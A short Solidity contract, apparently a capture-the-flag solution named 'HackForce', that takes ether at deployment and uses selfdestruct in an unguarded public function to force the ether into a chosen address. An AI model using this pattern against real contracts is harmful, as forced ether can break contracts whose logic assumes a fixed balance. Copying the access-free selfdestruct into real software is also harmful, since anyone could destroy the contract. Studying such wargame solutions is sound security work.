// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract HackForce {
    constructor() public payable {}

    function kill(address payable _adr) public {
        selfdestruct(_adr);
    }
}
